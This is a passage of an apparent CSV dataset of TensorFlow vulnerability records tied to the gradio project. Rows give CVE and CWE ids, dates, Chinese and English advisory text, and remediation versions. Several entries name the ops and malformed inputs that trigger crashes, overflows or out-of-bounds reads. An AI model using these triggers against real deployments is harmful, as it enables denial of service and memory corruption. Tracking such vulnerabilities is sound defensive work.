TensorFlow 2.12.0 版本之前的 2.12 版本和 2.11.1 版本之前的 2.11 版本存在安全漏洞，该漏洞源于如果 `tf.raw_ops.AvgPoolGrad` 的步幅和窗口大小不是正数，它会给出浮点异常。",2,2
gradio-app_gradio,tensorflow,,True,CVE-2022-29194,CWE-20,2022-05-20,"Google TensorFlow是美国谷歌（Google）公司的一套用于机器学习的端到端开源平台。
Google TensorFlow 2.9.0之前版本、2.8.1之前版本、2.7.2之前版本、2.6.4之前版本存在输入验证错误漏洞，该漏洞源于 tf.raw_ops.DeleteSessionTensor 不会完全验证输入参数，从而导致 CHECK 失败，并且触发拒绝服务攻击。",3,0
gradio-app_gradio,tensorflow,,True,CVE-2021-37692,CWE-20,2021-08-12,"Google TensorFlow是美国谷歌（Google）公司的一套用于机器学习的端到端开源平台。
Google TensorFlow 存在输入验证错误漏洞，该漏洞源于Go 代码可能会触发字符串释放中的段错误。",3,0
gradio-app_gradio,tensorflow,,True,,CWE-476,2020-04-01,"## Overview
[tensorflow](https://pypi.org/project/tensorflow/) is a machine learning framework.

Affected versions of this package are vulnerable to NULL Pointer Dereference. A carefully crafted GIF images can produce a null pointer dereference during decoding.
## Remediation
Upgrade `tensorflow` to version 1.12.2 or higher.
## References
- [GitHub Changelog](https://github.com/tensorflow/tensorflow/blob/622a516e710e249ddc65a8a977ff1ae78b4d2e4d/RELEASE.md#release-1122)
",3,0
gradio-app_gradio,tensorflow,,True,,CWE-125,2020-04-01,"## Overview
[tensorflow](https://pypi.org/project/tensorflow/) is a machine learning framework.

Affected versions of this package are vulnerable to Out-of-bounds Read. Decoding variant tensors from proto could result in heap out of bounds memory access.
## Remediation
Upgrade `tensorflow` to version 2.0.0 or higher.
## References
- [GitHub Changelog](https://github.com/tensorflow/tensorflow/blob/622a516e710e249ddc65a8a977ff1ae78b4d2e4d/RELEASE.md#release-200)
",3,0
gradio-app_gradio,tensorflow,,True,,CWE-400,2022-11-22,"## Overview
[tensorflow](https://pypi.org/project/tensorflow/) is a machine learning framework.

Affected versions of this package are vulnerable to Denial of Service (DoS) due to another discovered instance of [CVE-2022-35991](https://security.snyk.io/vuln/SNYK-PYTHON-TENSORFLOW-3026856), in `TensorListScatter` and `TensorListScatterV2` via non scalar inputs.

## Details

Denial of Service (DoS) describes a family of attacks, all aimed at making a system inaccessible to its intended and legitimate users.

Unlike other vulnerabilities, DoS attacks usually do not aim at breaching security. Rather, they are focused on making websites and services unavailable to genuine users resulting in downtime.

One popular Denial of Service vulnerability is DDoS (a Distributed Denial of Service), an attack that attempts to clog network pipes to the system by generating a large volume of traffic from many machines.

When it comes to open source libraries, DoS vulnerabilities allow attackers to trigger such a crash or crippling of the service by using a flaw either in the application code or from the use of open source libraries.

Two common types of DoS vulnerabilities:

* High CPU/Memory Consumption- An attacker sending crafted requests that could cause the system to take a disproportionate amount of time to process. For example, [commons-fileupload:commons-fileupload](SNYK-JAVA-COMMONSFILEUPLOAD-30082).

* Crash - An attacker sending crafted requests that could cause the system to crash. For Example,  [npm `ws` package](https://snyk.io/vuln/npm:ws:20171108)

## Remediation
Upgrade `tensorflow` to version 2.8.4, 2.9.3, 2.10.1 or higher.
## References
- [GitHub Commit](https://github.com/tensorflow/tensorflow/commit/bf9932fc907aff0e9e8cccf769e8b00d30fd81a1)
",3,0
gradio-app_gradio,tensorflow,,True,,CWE-400,2022-11-22,"## Overview
[tensorflow](https://pypi.org/project/tensorflow/) is a machine learning framework.

Affected versions of this package are vulnerable to Denial of Service (DoS) due to another discovered instance of [CVE-2022-35935](https://security.snyk.io/vuln/SNYK-PYTHON-TENSORFLOW-3026914) in `SobolSample` via assumed scalar inputs.

## Details

Denial of Service (DoS) describes a family of attacks, all aimed at making a system inaccessible to its intended and legitimate users.

Unlike other vulnerabilities, DoS attacks usually do not aim at breaching security. Rather, they are focused on making websites and services unavailable to genuine users resulting in downtime.

One popular Denial of Service vulnerability is DDoS (a Distributed Denial of Service), an attack that attempts to clog network pipes to the system by generating a large volume of traffic from many machines.

When it comes to open source libraries, DoS vulnerabilities allow attackers to trigger such a crash or crippling of the service by using a flaw either in the application code or from the use of open source libraries.

Two common types of DoS vulnerabilities:

* High CPU/Memory Consumption- An attacker sending crafted requests that could cause the system to take a disproportionate amount of time to process. For example, [commons-fileupload:commons-fileupload](SNYK-JAVA-COMMONSFILEUPLOAD-30082).

* Crash - An attacker sending crafted requests that could cause the system to crash. For Example,  [npm `ws` package](https://snyk.io/vuln/npm:ws:20171108)

## Remediation
Upgrade `tensorflow` to version 2.8.4, 2.9.3, 2.10.1 or higher.
## References
- [GitHub Commit #1](https://github.com/tensorflow/tensorflow/commit/c65c67f88ad770662e8f191269a907bf2b94b1bf)
- [GitHub Commit #2](https://github.com/tensorflow/tensorflow/commit/02400ea266bd811fc016a848445de1bbff3a23a0)
",2,2
gradio-app_gradio,tensorflow,,True,CVE-2022-41908,CWE-20,2022-11-18,Google TensorFlow是一个用于机器学习的端到端开源平台。该漏洞源于不是UTF-8字节串的输入'token'将在'tf.raw_ops.PyFunc'中触发'CHECK'失败。涉及的版本包括2.8.4之前的版本、2.9.0到2.9.3和2.10.0版本。,3,0
gradio-app_gradio,tensorflow,,True,CVE-2021-41200,CWE-617,2021-11-05,"Google TensorFlow是美国谷歌（Google）公司的一套用于机器学习的端到端开源平台。
Google TensorFlow 存在安全漏洞，在受影响的版本中，如果使用非标量参数调用 `tf.summary.create_file_writer`，代码会由于 `CHECK` 失败而崩溃。",3,0
gradio-app_gradio,tensorflow,,True,CVE-2021-37645,CWE-681,2021-08-12,"Google TensorFlow是美国谷歌（Google）公司的一套用于机器学习的端到端开源平台。
Google TensorFlow存在数字错误漏洞，该漏洞源于在受影响的版本中，“tf.raw_ops.QuantizeAndDequantizeV4Grad”的实现容易受到整数溢出问题的攻击，这是由于将有符号整数值转换为无符号整数值，然后根据该值分配内存而导致的。",3,0
gradio-app_gradio,tensorflow,,True,CVE-2021-41223,CWE-125,2021-11-05,"Google TensorFlow是美国谷歌（Google）公司的一套用于机器学习的端到端开源平台。
Google TensorFlow 存在缓冲区错误漏洞，该漏洞源于在受影响的版本中，`FusedBatchNorm` 内核的实现容易受到堆 OOB 访问的影响。",3,0
gradio-app_gradio,tensorflow,,True,CVE-2022-21729,CWE-190,2022-02-03,"Google TensorFlow是美国谷歌（Google）公司的一套用于机器学习的端到端开源平台。
Tensorflow 存在安全漏洞，该漏洞源于explaindex的实现容易受到由整数溢出bug引起的除0的影响。",2,0
gradio-app_gradio,tensorflow,,True,CVE-2021-37653,CWE-369,2021-08-12,"Google TensorFlow是美国谷歌（Google）公司的一套用于机器学习的端到端开源平台。
Google TensorFlow 存在数字错误漏洞，该漏洞源于`ResourceGather`中的除以0错误。",3,0
gradio-app_gradio,tensorflow,,True,CVE-2021-41201,CWE-824,2021-11-05,"Google TensorFlow是美国谷歌（Google）公司的一套用于机器学习的端到端开源平台。
Google TensorFlow 存在缓冲区错误漏洞，该漏洞可能导致未初始化的变量访问。",2,0
gradio-app_gradio,tensorflow,,True,CVE-2022-23570,CWE-476 CWE-617,2022-02-04,TensorFlow在从protobuf解码张量时，如果某些操作的可变参数的属性缺失，可能会发生空指针解引用。尽管这种情况被`DCHECK`保护，但生产环境下`DCHECK`不会执行任何操作，而在调试构建中会因断言失败而崩溃。在第一种情况下，程序会继续执行到空指针的解引用，而第二种情况下会因断言失败而崩溃。,2,0
gradio-app_gradio,tensorflow,,True,CVE-2021-29551,CWE-125,2021-05-14,"Google TensorFlow是美国谷歌（Google）公司的一套用于机器学习的端到端开源平台。
TensorFlow 2.4.2,2.3.3,2.2.3，2.1.4存在缓冲区错误漏洞，该漏洞源于MatrixTriangularSolve实现将无法终止内核执行。",4,0
gradio-app_gradio,tensorflow,,True,CVE-2021-29539,CWE-681,2021-05-14,"Google TensorFlow是美国谷歌（Google）公司的一套用于机器学习的端到端开源平台。
TensorFlow 存在安全漏洞，该漏洞源于代码假定张量内容是纯标量，变体会导致实现中的段错误。",4,0
gradio-app_gradio,tensorflow,,True,CVE-2021-37691,CWE-369,2021-08-12,"Google TensorFlow是美国谷歌（Google）公司的一套用于机器学习的端到端开源平台。
Google TensorFlow 存在数字错误漏洞，该漏洞源于TFLite 中除法的实现易受 0 错误除法的影响。",3,0
gradio-app_gradio,tensorflow,,True,CVE-2023-25661,CWE-20,2023-03-27,Google TensorFlow是美国谷歌（Google）公司的一套用于机器学习的端到端开源平台。TensorFlow 2.11.1之前版本存在输入验证错误漏洞，该漏洞源于恶意的无效输入会使tensorflow模型崩溃，并可用于触发拒绝服务攻击。,3,0
gradio-app_gradio,tensorflow,,True,CVE-2021-29562,CWE-617,2021-05-14,"Google TensorFlow是美国谷歌（Google）公司的一套用于机器学习的端到端开源平台。
TensorFlow 2.4.2,2.3.3,2.2.3，2.1.4存在安全漏洞，攻击者可利用该漏洞可以通过利用来自实现CHECK失败来导致拒绝服务。",4,0
gradio-app_gradio,tensorflow,,True,CVE-2021-29586,CWE-369,2021-05-14,"Google TensorFlow是美国谷歌（Google）公司的一套用于机器学习的端到端开源平台。
TensorFlow 2.4.2,2.3.3,2.2.3，2.1.4存在安全漏洞，该漏洞源于调用ComputePaddingHeightWidth之前没有检查stride是否为0。",4,0
gradio-app_gradio,tensorflow,,True,CVE-2021-37668,CWE-369,2021-08-12,"Google TensorFlow是美国谷歌（Google）公司的一套用于机器学习的端到端开源平台。
Google TensorFlow 中存在数字错误漏洞，该漏洞源于产品的 tf.raw_ops.UnravelIndex 未对除数做有效限制，攻击者可通过除0导致拒绝服务。以下产品及版本收到影响：TensorFlow 2.5.1、TensorFlow 2.4.3 和 TensorFlow 2.3.4。",3,0
gradio-app_gradio,tensorflow,,True,CVE-2023-25675,CWE-697,2023-03-24,"Google TensorFlow是美国谷歌（Google）公司的一套用于机器学习的端到端开源平台。
Google TensorFlow 2.12.0 版本之前的 2.12 版本和 2.11.1 版本之前的 2.11 版本存在安全漏洞，该漏洞源于当使用 XLA 运行 2.12.0 和 2.11.1 之前的版本时，如果给定的参数 weights 与参数 arr 的形状既不相同，也不是长度为 0 的张量，则 `tf.raw_ops.Bincount` 会出现段错误。",2,2
gradio-app_gradio,tensorflow,,True,CVE-2020-15211,CWE-125 CWE-787,2020-09-25,"Google TensorFlow是美国谷歌（Google）公司的一套用于机器学习的端到端开源平台。
tensorflow-lite 1.15.4之前版本, 2.0.3版本, 2.1.2版本, 2.2.1版本，2.3.1版本中存在安全漏洞，该漏洞允许攻击者从堆分配的数组的边界之外进行写入和读取。",3,0
gradio-app_gradio,tensorflow,,True,CVE-2022-41883,CWE-125,2022-11-18,Google TensorFlow是一款用于机器学习的开源平台。该漏洞源于操作接收到不同数量的输入时，错误地处理输入大小，导致执行程序崩溃。,3,0
gradio-app_gradio,tensorflow,,True,CVE-2022-29203,CWE-190,2022-05-20,"Google TensorFlow是美国谷歌（Google）公司的一套用于机器学习的端到端开源平台。
Google TensorFlow 2.9.0之前版本、2.8.1之前版本、2.7.2之前版本和2.6.4之前版本存在输入验证错误漏洞，该漏洞源于tf.raw_ops.SpaceToBatchND存在整数溢出问题。攻击者可以通过断言失败利用该漏洞实现拒绝服务攻击。",3,0
gradio-app_gradio,tensorflow,,True,CVE-2022-23569,CWE-617,2022-02-03,"Google TensorFlow是美国谷歌（Google）公司的一套用于机器学习的端到端开源平台。
Tensorflow 存在安全漏洞，该漏洞源于TensorFlow中的多个操作可以通过CHECK失败(即断言失败)来触发拒绝服务。",2,0
gradio-app_gradio,tensorflow,,True,CVE-2022-29207,CWE-20 CWE-475,2022-05-20,"Google TensorFlow是美国谷歌（Google）公司的一套用于机器学习的端到端开源平台。
Google TensorFlow 2.9.0之前版本、2.8.1之前版本、2.7.2之前版本和2.6.4之前版本存在安全漏洞，该漏洞源于当提供给应用的资源句柄无效时，多个tensorflow操作在急切模式下行为异常。",3,0
gradio-app_gradio,tensorflow,,True,CVE-2022-35968,CWE-617,2022-09-16,"Google TensorFlow是美国谷歌（Google）公司的一套用于机器学习的端到端开源平台。
Google TensorFlow 存在安全漏洞，该漏洞源于 AvgPoolGrad 的实现没有完全验证输入 orig_input_shape 。这会导致断言失败，该失败可用于触发拒绝服务攻击。该漏洞将在 2.10.0 版本， 2.9.1 版本， 2.8.1 版本， 2.7.2 版本中得到修复。",3,0
gradio-app_gradio,tensorflow,,True,CVE-2021-41221,CWE-120 CWE-787,2021-11-05,"Google TensorFlow是美国谷歌（Google）公司的一套用于机器学习的端到端开源平台。
Google TensorFlow 存在缓冲区错误漏洞，该漏洞源于 Cudnn* 操作的形状推断代码可以通过堆缓冲区溢出被欺骗访问无效内存。",2,0
gradio-app_gradio,tensorflow,,True,CVE-2021-37646,CWE-681,2021-08-12,"Google TensorFlow是美国谷歌（Google）公司的一套用于机器学习的端到端开源平台。
Google TensorFlow 存在安全漏洞，该漏洞源于""tf.raw_ops.StringNGrams""的实现容易受到整数溢出问题的影响，该问题是由将有符号整数值转换为无符号整数值然后根据该值分配内存而引起的。以下产品及版本收到影响：TensorFlow 2.5.1、TensorFlow 2.4.3 和 TensorFlow 2.3.4。",3,0
gradio-app_gradio,tensorflow,,True,CVE-2023-25672,CWE-476,2023-03-24,"Google TensorFlow是美国谷歌（Google）公司的一套用于机器学习的端到端开源平台。
TensorFlow 2.12.0 版本之前的 2.12 版本和 2.11.1 版本之前的 2.11 版本存在代码问题漏洞，该漏洞源于函数 `tf.raw_ops.LookupTableImportV2` 无法处理 `values` 参数中的标量并给出 NPE。",2,2
gradio-app_gradio,tensorflow,,True,CVE-2022-23585,CWE-401,2022-02-04,"Google TensorFlow是美国谷歌（Google）公司的一套用于机器学习的端到端开源平台。
Tensorflow 存在安全漏洞，该漏洞源于当解码PNG图像时，如果图像无效，TensorFlow可能会产生内存泄漏。",3,0
gradio-app_gradio,tensorflow,,True,CVE-2023-25668,CWE-122 CWE-125,2023-03-24,Google TensorFlow是美国谷歌（Google）公司的一套用于机器学习的端到端开源平台。存在安全漏洞，攻击者可以利用该漏洞访问不受用户控制的堆内存，从而导致程序崩溃或远程代码执行。,1,2
gradio-app_gradio,tensorflow,,True,CVE-2021-29535,CWE-131 CWE-787,2021-05-14,"Google TensorFlow是美国谷歌（Google）公司的一套用于机器学习的端到端开源平台。
TensorFlow 2.4.2,2.3.3,2.2.3，2.1.4存在安全漏洞，攻击者可利用该漏洞可以通过传入无效的量化阈值来导致“QuantizedMul”中的堆缓冲区溢出。",4,0
gradio-app_gradio,tensorflow,,True,CVE-2022-41895,CWE-125,2022-11-18,Google TensorFlow是美国谷歌（Google）公司的一套用于机器学习的端到端开源平台。该漏洞源于如果 `MirrorPadGrad` 的输入 `paddings` 过大，TensorFlow 将生成堆信息外带（Out of Band）错误，导致缓冲区溢出。,3,0
gradio-app_gradio,tensorflow,,True,CVE-2022-35994,CWE-617,2022-09-16,"Google TensorFlow是美国谷歌（Google）公司的一套用于机器学习的端到端开源平台。
Google TensorFlow 存在安全漏洞，该漏洞源于当 CollectiveGather 接收到标量输入 input 时，它会给出断言失败，可用于触发拒绝服务攻击。该漏洞将在 2.10.0 版本， 2.9.1 版本， 2.8.1 版本， 2.7.2 版本中得到修复。",3,0
gradio-app_gradio,tensorflow,,True,CVE-2021-29573,CWE-369,2021-05-14,"Google TensorFlow是美国谷歌（Google）公司的一套用于机器学习的端到端开源平台。
TensorFlow 2.4.2,2.3.3,2.2.3，2.1.4存在数字错误漏洞，该漏洞源于tf.raw_ops.MaxPoolGradWithArgmax容易被0除法。",4,0
gradio-app_gradio,tensorflow,,True,CVE-2021-41218,CWE-369,2021-11-05,"Google TensorFlow是美国谷歌（Google）公司的一套用于机器学习的端到端开源平台。
Google TensorFlow 2.7.0之前版本存在数字错误漏洞，该漏洞源于TensorFlow中的AllToAll在推断代码时会执行除以0。",3,0
gradio-app_gradio,tensorflow,,True,CVE-2021-41197,CWE-190,2021-11-05,"Google TensorFlow是美国谷歌（Google）公司的一套用于机器学习的端到端开源平台。
Google TensorFlow 存在输入验证错误漏洞，该漏洞源于 TensorFlow 允许张量具有大量维度，并且每个维度都可以根据需要进行调整。",3,0
gradio-app_gradio,tensorflow,,True,CVE-2021-29544,CWE-754,2021-05-14,"TensorFlow是TensorFlow开源的一套用于机器学习的端到端开源平台。
TensorFlow存在代码问题漏洞，攻击者可利用该漏洞可以通过利用来自实现CHECK失败来导致拒绝服务。",4,0
gradio-app_gradio,tensorflow,,True,CVE-2021-37657,CWE-824,2021-08-12,"Google TensorFlow是美国谷歌（Google）公司的一套用于机器学习的端到端开源平台。
Google TensorFlow 存在缓冲区错误漏洞，攻击者可以通过在所有类型为""tf.raw_ops.MatrixDiagV*""的操作中绑定对空指针的引用来导致未定义的行为。以下产品及版本收到影响：TensorFlow 2.5.1、TensorFlow 2.4.3 和 TensorFlow 2.3.4。",3,0
gradio-app_gradio,tensorflow,,True,CVE-2022-23581,CWE-617,2022-02-04,"Google TensorFlow是美国谷歌（Google）公司的一套用于机器学习的端到端开源平台。
Tensorflow 存在安全漏洞，该漏洞源于TensorFlow中的er优化器可以通过修改SavedModel来导致拒绝服务，这样issimplifiableshape就会触发CHECK失败。",3,0
gradio-app_gradio,tensorflow,,True,CVE-2022-41880,CWE-125,2022-11-18,Google TensorFlow是美国谷歌（Google）公司的一套用于机器学习的端到端开源平台。该漏洞源于 `BaseCandidateSamplerOp` 函数接收到 `true_classes` 中的值大于 `range_max` 时，会发生堆外读取。,3,0
gradio-app_gradio,tensorflow,,True,CVE-2021-29599,CWE-369,2021-05-14,"Google TensorFlow是美国谷歌（Google）公司的一套用于机器学习的端到端开源平台。
TensorFlow 2.4.2,2.3.3,2.2.3，2.1.4 存在数字错误漏洞，该漏洞源于“Split”TFLite操作符的实现容易受到被零除法错误的影响。",4,0
gradio-app_gradio,tensorflow,,True,CVE-2020-15194,CWE-20 CWE-617,2020-09-25,"Google TensorFlow是美国谷歌（Google）公司的一套用于机器学习的端到端开源平台。
Tensorflow  SparseFillEmptyRowsGrad 1.15.4之前版本, 2.0.3版本, 2.1.2版本, 2.2.1版本，2.3.1版本中存在安全漏洞，该漏洞源于SparseFillEmptyRowsGrad实现对其参数形状的验证不完全，该漏洞允许攻击者可以传递错误的grad_values_t来触发vec中的断言失败，从而导致服务安装中的服务被拒绝。",3,2
gradio-app_gradio,tensorflow,,True,CVE-2021-37665,CWE-20,2021-08-12,"Google TensorFlow是美国谷歌（Google）公司的一套用于机器学习的端到端开源平台。
Google TensorFlow 中存在输入验证错误漏洞，该漏洞源于产品 requantization 的 MKL 实现未对空指针做有效验证，攻击者可通过解引用空指针访问堆分配数组之外的数据。以下产品及版本收到影响：TensorFlow 2.5.1、TensorFlow 2.4.3 和 TensorFlow 2.3.4。",2,0
gradio-app_gradio,tensorflow,,True,CVE-2020-15208,CWE-125 CWE-787,2020-09-25,"Google TensorFlow是美国谷歌（Google）公司的一套用于机器学习的端到端开源平台。
tensorflow-lite 1.15.4之前版本, 2.0.3版本, 2.1.2版本, 2.2.1版本，2.3.1版本中存在安全漏洞，该漏洞允许攻击者进行超出范围的读写操作。",2,0
gradio-app_gradio,tensorflow,,True,CVE-2022-29216,CWE-94,2022-05-20,"Google TensorFlow是美国谷歌（Google）公司的一套用于机器学习的端到端开源平台。
TensorFlow 2.9.0之前版本、2.8.1之前版本、2.7.2之前版本和2.6.4之前版本存在代码注入漏洞，该漏洞源于saved_model_cli工具存在代码注入问题。",2,0
gradio-app_gradio,tensorflow,,True,CVE-2021-29518,CWE-476,2021-05-14,"Google TensorFlow是美国谷歌（Google）公司的一套用于机器学习的端到端开源平台。
TensorFlow 2.4.2,2.3.3,2.2.3，2.1.4 存在安全漏洞，该漏洞源于在立即模式下会话操作是无效的。但是用户仍然可以调用与之关联的原始操作，并触发空指针解引用。",4,0
gradio-app_gradio,tensorflow,,True,CVE-2021-29582,CWE-125,2021-05-14,"Google TensorFlow是美国谷歌（Google）公司的一套用于机器学习的端到端开源平台。
TensorFlow 2.4.2,2.3.3,2.2.3，2.1.4存在缓冲区错误漏洞，该漏洞源于tf.raw_ops.Dequantize缺少验证。攻击者可利用该漏洞可以从堆分配的数据边界之外触发读取。",4,0
gradio-app_gradio,tensorflow,,True,CVE-2022-35986,CWE-20,2022-09-16,"Google TensorFlow是美国谷歌（Google）公司的一套用于机器学习的端到端开源平台。
Google TensorFlow 存在安全漏洞，该漏洞源于如果 RaggedBincount 被赋予一个空的输入张量 splits ，则会导致可用于触发拒绝服务攻击的段错误。该漏洞将在 2.10.0 版本， 2.9.1 版本， 2.8.1 版本， 2.7.2 版本中得到修复。",3,0
gradio-app_gradio,tensorflow,,True,CVE-2021-41196,CWE-191,2021-11-05,"Google TensorFlow是美国谷歌（Google）公司的一套用于机器学习的端到端开源平台。
Google TensorFlow 存在数字错误漏洞，该漏洞源于 TensorFlow 实现了池化操作，其中滑动窗口中的值没有被严格检查为正数。",3,0
gradio-app_gradio,tensorflow,,True,CVE-2020-15195,CWE-119 CWE-122 CWE-787,2020-09-25,"Google TensorFlow是美国谷歌（Google）公司的一套用于机器学习的端到端开源平台。
 Tensorflow SparseFillEmptyRowsGrad 1.15.4之前版本, 2.0.3版本, 2.1.2版本, 2.2.1版本，2.3.1版本中存在安全漏洞，该漏洞允许攻击者造成缓存区溢出问题。",3,0
gradio-app_gradio,tensorflow,,True,CVE-2021-37684,CWE-369,2021-08-12,"Google TensorFlow是美国谷歌（Google）公司的一套用于机器学习的端到端开源平台。
Google TensorFlow 存在数字错误漏洞，该漏洞源于TFLite 中除法的实现易受 0 错误除法的影响。",3,0
gradio-app_gradio,tensorflow,,True,CVE-2021-37656,CWE-824,2021-08-12,"Google TensorFlow是美国谷歌（Google）公司的一套用于机器学习的端到端开源平台。
Google TensorFlow 存在缓冲区错误漏洞，攻击者可以通过将引用绑定到""tf.raw_ops.RaggedTensorToSparse""中的空指针来导致未定义的行为。以下产品及版本收到影响：TensorFlow 2.5.1、TensorFlow 2.4.3 和 TensorFlow 2.3.4。",3,0
gradio-app_gradio,tensorflow,,True,CVE-2018-21233,CWE-125,2020-05-04,"Google TensorFlow是美国谷歌（Google）公司的一套用于机器学习的端到端开源平台。
Google TensorFlow 1.7.0之前版本中的core/kernels/decode_bmp_op.cc文件的BMP decoder的DecodeBmp功能存在缓冲区错误漏洞。攻击者可利用该漏洞获取进程内存的内容。",2,0
gradio-app_gradio,tensorflow,,True,CVE-2022-35938,CWE-125,2022-09-16,"Google TensorFlow是美国谷歌（Google）公司的一套用于机器学习的端到端开源平台。
Google TensorFlow 存在缓冲区错误漏洞，该漏洞源于 GatherNd 函数接受确定输入和输出大小的参数。如果给定的输入大于或等于输出的大小，则会触发越界内存读取或崩溃。该漏洞将在 2.10.0 版本， 2.9.1 版本， 2.8.1 版本， 2.7.2 版本中得到修复。",2,0
gradio-app_gradio,tensorflow,,True,CVE-2021-41225,CWE-908,2021-11-05,"Google TensorFlow是美国谷歌（Google）公司的一套用于机器学习的端到端开源平台。
Google TensorFlow 存在安全漏洞，该漏洞源于 Grappler 优化器使用了未初始化的变量。 如果 train_nodes 向量（从保存的优化模型中获得）不包含 Dequeue 节点，那么 dequeue_node 将被单元化。",3,0
gradio-app_gradio,tensorflow,,True,CVE-2021-29564,CWE-476,2021-05-14,"Google TensorFlow是美国谷歌（Google）公司的一套用于机器学习的端到端开源平台。
TensorFlow 2.4.2,2.3.3,2.2.3，2.1.4存在代码问题漏洞，攻击者可利用该漏洞触发空指针解引用。",4,0
gradio-app_gradio,tensorflow,,True,CVE-2022-29200,CWE-20 CWE-1284,2022-05-20,"Google TensorFlow是美国谷歌（Google）公司的一套用于机器学习的端到端开源平台。
Google TensorFlow 2.9.0之前版本、2.8.1之前版本、2.7.2之前版本、2.6.4之前版本存在输入验证错误漏洞，该漏洞源于 tf.raw_ops.LSTMBlockCell 不会完全验证输入参数，从而导致 CHECK 失败，并且触发拒绝服务攻击。",3,0
gradio-app_gradio,tensorflow,,True,CVE-2022-41896,CWE-20 CWE-1284,2022-11-18,Google TensorFlow是美国谷歌（Google）公司的一套用于机器学习的端到端开源平台。该漏洞源于如果 `ThreadUnsafeUnigramCandidateSampler` 的输入 `filterbank_channel_count` 大于允许的最大大小，TensorFlow 将崩溃。,3,0
gradio-app_gradio,tensorflow,,True,CVE-2021-37679,CWE-125 CWE-681,2021-08-12,"Google TensorFlow是美国谷歌（Google）公司的一套用于机器学习的端到端开源平台。
Google TensorFlow 中存在缓冲区错误漏洞，该漏洞源于产品可能会泄露内存信息。 以下产品及版本收到影响：TensorFlow 2.5.1、TensorFlow 2.4.3 和 TensorFlow 2.3.4。",2,0
gradio-app_gradio,tensorflow,,True,CVE-2022-23580,CWE-400 CWE-1284,2022-02-04,"Google TensorFlow是美国谷歌（Google）公司的一套用于机器学习的端到端开源平台。
Tensorflow 存在资源管理错误漏洞，修复将包含在TensorFlow 2.8.0中。我们也会在TensorFlow 2.7.1、TensorFlow 2.6.3和TensorFlow 2.5.3上选择这个提交，因为这些也会受到影响，并且仍然在支持范围内。",3,0
gradio-app_gradio,tensorflow,,True,CVE-2021-37663,CWE-20,2021-08-12,"Google TensorFlow是美国谷歌（Google）公司的一套用于机器学习的端到端开源平台。
Google TensorFlow 存在输入验证错误漏洞，该漏洞源于在受影响的版本中，tf.raw_ops.QuantizeV2 中的不完整验证造成的。攻击者可利用该漏洞通过将引用绑定到空指针来触发未定义的行为，或者可以访问堆分配数组边界之外的数据。",2,0
gradio-app_gradio,tensorflow,,True,CVE-2021-37649,CWE-476,2021-08-12,"Google TensorFlow是美国谷歌（Google）公司的一套用于机器学习的端到端开源平台。
TensorFlow 2.6.0 之前版本、2.5.1之前版本、2.4.3之前版本和2.3.4之前版本存在代码问题漏洞，该漏洞源于“tf.raw_ops.UncompressElement”的代码可以用来触发空指针解引用",2,0
gradio-app_gradio,tensorflow,,True,CVE-2022-41898,CWE-20,2022-11-18,Google TensorFlow是美国谷歌（Google）公司的一套用于机器学习的端到端开源平台。出现此漏洞是因为如果 `SparseFillEmptyRowsGrad` 的输入为空，TensorFlow将崩溃。,3,0
gradio-app_gradio,tensorflow,,True,CVE-2022-35935,CWE-617,2022-09-16,"Google TensorFlow是美国谷歌（Google）公司的一套用于机器学习的端到端开源平台。
Google TensorFlow 存在安全漏洞，该漏洞源于容易受到因断言失败导致的拒绝服务攻击。该漏洞将在 2.10.0 版本， 2.9.1 版本， 2.8.1 版本， 2.7.2 版本中得到修复。",3,0
gradio-app_gradio,tensorflow,,True,CVE-2022-23568,CWE-190,2022-02-03,"Google TensorFlow是美国谷歌（Google）公司的一套用于机器学习的端到端开源平台。
Tensorflow 存在安全漏洞，该漏洞源于AddManySparseToTensorsMap的实现容易受到整数溢出的影响，当构建新的TensorShape对象时，会导致CHECK失败(基于拒绝服务的断言失败)。",2,0
gradio-app_gradio,tensorflow,,True,CVE-2020-26268,CWE-471,2020-12-10,"Google TensorFlow是美国谷歌（Google）公司的一套用于机器学习的端到端开源平台。
TensorFlow存在安全漏洞，攻击者可利用该漏洞导致缓冲区溢出。以下产品及版本受到影响：1.15.5、2.0.4、2.1.3、2.2.2、2.3.2、2.4.0。",3,0
gradio-app_gradio,tensorflow,,True,CVE-2021-29600,CWE-369,2021-05-14,"Google TensorFlow是美国谷歌（Google）公司的一套用于机器学习的端到端开源平台。
TensorFlow 2.4.2,2.3.3,2.2.3，2.1.4存在数字错误漏洞，该漏洞源于TFLite操作符OneHot的实现是一个除法零错误。",4,0
gradio-app_gradio,tensorflow,,True,CVE-2020-15266,CWE-119,2020-10-21,"Google TensorFlow是美国谷歌（Google）公司的一套用于机器学习的端到端开源平台。
Tensorflow 2.4.0之前版本存在安全漏洞，该漏洞源于当tf.image.crop_and_resize 的 boxes的参数有一个非常大的值，CPU内核实现接收它作为一个c++  nan 浮点值。试图对其进行操作是一种未定义的行为，稍后会产生分割错误。",3,0
gradio-app_gradio,tensorflow,,True,CVE-2023-25665,CWE-476,2023-03-24,Google TensorFlow是一个用于机器学习的开源平台。2.12.0版本之前的2.12版本和2.11.1版本之前的2.11版本存在代码问题，该漏洞源于当'SparseSparseMaximum'被赋予无效的稀疏张量作为输入时，会导致空指针解引用错误。,2,2
gradio-app_gradio,tensorflow,,True,CVE-2019-16778,CWE-122 CWE-681,2019-12-16,"Google TensorFlow是美国谷歌（Google）公司的一套用于机器学习的端到端开源平台。
Google TensorFlow 1.15之前版本中的UnsortedSegmentSum存在缓冲区错误漏洞，该漏洞源于程序没有正确检查边界。本地攻击者可利用该漏洞在系统上执行任意代码或导致应用程序崩溃。",4,0
gradio-app_gradio,tensorflow,,True,CVE-2022-21726,CWE-125,2022-02-03,"Google TensorFlow是美国谷歌（Google）公司的一套用于机器学习的端到端开源平台。
Tensorflow 存在缓冲区错误漏洞，该漏洞源于Dequantize的实现并不完全验证axis的值，并可能导致堆OOB访问。",2,0
gradio-app_gradio,tensorflow,,True,CVE-2021-41216,CWE-120 CWE-787,2021-11-05,"Google TensorFlow是美国谷歌（Google）公司的一套用于机器学习的端到端开源平台。
Google TensorFlow 存在缓冲区错误漏洞，该漏洞源于 Transpose 的形状推断函数容易受到堆缓冲区溢出的影响。",3,0
gradio-app_gradio,tensorflow,,True,CVE-2022-23577,CWE-476,2022-02-04,"Google TensorFlow是美国谷歌（Google）公司的一套用于机器学习的端到端开源平台。
Tensorflow 存在代码问题漏洞，该漏洞源于 GetInitOp 的实现很容易因对空指针进行解引用而导致崩溃。",2,0
gradio-app_gradio,tensorflow,,True,CVE-2021-41204,CWE-824,2021-11-05,"Google TensorFlow是美国谷歌（Google）公司的一套用于机器学习的端到端开源平台。
